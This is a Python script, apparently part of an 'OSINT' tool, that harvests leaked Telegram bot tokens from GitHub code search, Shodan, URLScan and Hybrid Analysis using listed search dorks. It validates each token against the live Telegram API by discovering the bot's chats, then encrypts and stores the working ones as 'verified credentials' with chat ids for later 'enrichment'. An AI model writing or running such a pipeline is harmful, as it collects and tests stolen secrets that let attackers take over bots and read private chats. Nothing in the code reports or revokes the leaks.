import asyncio
import sys
import os
import hashlib
import time

# Add project root to sys.path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from app.core.database import db
from app.core.security import security
from app.services.scanners import ShodanService, GithubService, UrlScanService, HybridAnalysisService
from app.services.broadcaster_srv import broadcaster_service

# Initialize Services (Fofa/Censys REMOVED - API access issues)
shodan = ShodanService()
github = GithubService()
urlscan = UrlScanService()
hybrid = HybridAnalysisService()

def _calculate_hash(token: str) -> str:
    return hashlib.sha256(token.encode()).hexdigest()

async def save_manifest(results, source_name: str, verbose=True):
    """
    STRICT validation: Only saves if BOTH token is valid AND chat_id can be discovered.
    """
    from app.services.scraper_srv import scraper_service
    from app.services.scanners import _is_valid_token
    
    saved_count = 0
    for item in results:
        token = item.get("token")
        if not token or token == "MANUAL_REVIEW_REQUIRED":
            continue
        
        # Step 0: Validate token format FIRST
        if not _is_valid_token(token):
            if verbose:
                print(f"  ❌ Invalid token format (Fernet/hash?): {token[:20]}...")
            continue
        
        token_hash = _calculate_hash(token)
        
        try:
            # Step 1: Check if already exists
            existing = db.table("discovered_credentials").select("id").eq("token_hash", token_hash).execute()
            if existing.data:
                if verbose:
                    print(f"  ⏭️ Token already exists, skipping.")
                continue
            
            # Step 2: STRICT - Validate by discovering chats (REQUIRED)
            if verbose:
                print(f"  🔍 Validating token {token[:15]}... via Telegram API")
            chats = await scraper_service.discover_chats(token)
            
            if not chats:
                if verbose:
                    print(f"  ❌ No chats found - NOT SAVING (strict mode)")
                await broadcaster_service.send_log(f"⚠️ [{source_name}] Token found but no chats - not saved.")
                continue
            
            # Step 3: Token valid AND has chats - save with chat_id
            first_chat = chats[0]
            encrypted_token = security.encrypt(token)
            
            data = {
                "bot_token": encrypted_token,
                "token_hash": token_hash,
                "chat_id": first_chat.get("id"),  # REQUIRED!
                "source": source_name,
                "status": "active",  # Already validated!
                "meta": {
                    **item.get("meta", {}),
                    "chat_name": first_chat.get("name"),
                    "chat_type": first_chat.get("type"),
                    "total_chats": len(chats)
                }
            }
            
            res = db.table("discovered_credentials").insert(data).execute()
            
            if res.data:
                if verbose:
                    print(f"  🎯 [NEW] Verified Credential ID: {res.data[0]['id']}")
                await broadcaster_service.send_log(
                    f"🎯 [{source_name}] **Verified Credential!**\n"
                    f"ID: `{res.data[0]['id']}`\n"
                    f"Chat: {first_chat.get('name')} ({first_chat.get('type')})"
                )
                saved_count += 1
                
        except Exception as e:
            if verbose: print(f"  ❌ Save Error: {e}")
            pass
    return saved_count

async def run_scanners():
    print("🚀 Starting LOCAL OSINT Scan (All Sources)...")
    await broadcaster_service.send_log("🚀 **Manual Scan Started** (Local Script)")
    print("-------------------------------------------------")

    # 1. Hybrid Analysis
    print("\n🦠 [HybridAnalysis] Starting Scan...")
    try:
        query = "api.telegram.org"
        print(f"  > Query: {query}")
        results = hybrid.search(query)
        # HA often returns manual review needed, but let's try
        count = await save_manifest(results, "hybrid_analysis")
        print(f"  ✅ Processed {len(results)} reports ({count} tokens saved).")
    except Exception as e:
        print(f"  ❌ HybridAnalysis Error: {e}")

    # 2. URLScan (replaces Censys)
    print("\n🔍 [URLScan] Starting Scan...")
    try:
        query = "api.telegram.org"
        print(f"  > Query: {query}")
        print("  > Note: Deep scanning each result URL for tokens")
        results = urlscan.search(query)
        count = await save_manifest(results, "urlscan")
        print(f"  ✅ Saved {count} new credentials (from {len(results)} hits).")
    except Exception as e:
        print(f"  ❌ URLScan Error: {e}")

    # 3. GitHub
    print("\n🐱 [GitHub] Starting Scan...")
    dorks = [
        "filename:.env api.telegram.org",
        "path:config api.telegram.org",
        "\"TELEGRAM_BOT_TOKEN\"",
        "language:python \"ApplicationBuilder\" \"token\"",
        "language:python \"Telethon\" \"api_id\"",
        "filename:config.json \"bot_token\"",
        "filename:settings.py \"TELEGRAM_TOKEN\"",
         "\"api.telegram.org\""
    ]
    
    total_gh = 0
    for i, dork in enumerate(dorks):
        print(f"  > Dorking: {dork}")
        try:
            results = github.search(dork)
            count = await save_manifest(results, "github")
            total_gh += count
            print(f"    Found {len(results)} matches, {count} new.")
        except Exception as e:
            print(f"    ❌ Error: {e}")
        
        if i < len(dorks) - 1:
            time.sleep(2) # Respect rate limits slightly

    # 4. Shodan
    print("\n🌎 [Shodan] Starting Scan...")
    shodan_queries = [
        "http.html:\"api.telegram.org\"",
        "http.html:\"bot_token\"", 
        "http.title:\"Telegram Bot\"",
        "http.title:\"Telegram Login\""
    ]
    
    for q in shodan_queries:
        print(f"  > Querying: {q}")
        try:
            results = shodan.search(q)
            count = await save_manifest(results, "shodan")
            print(f"    ✅ Saved {count} new credentials (from {len(results)} hits).")
            time.sleep(1)
        except Exception as e:
            print(f"    ❌ Error: {e}")

    print("\n-------------------------------------------------")
    print("🏁 Full Scan Complete.")
    await broadcaster_service.send_log("🏁 **Manual Scan Complete.** Check Monitor Group for details.")
    print("   Check your Railway Worker logs (General Topic) for Enrichment alerts!")
    print("   (The worker will see the new 'pending' rows and enrich them automatically)")

if __name__ == "__main__":
    asyncio.run(run_scanners())
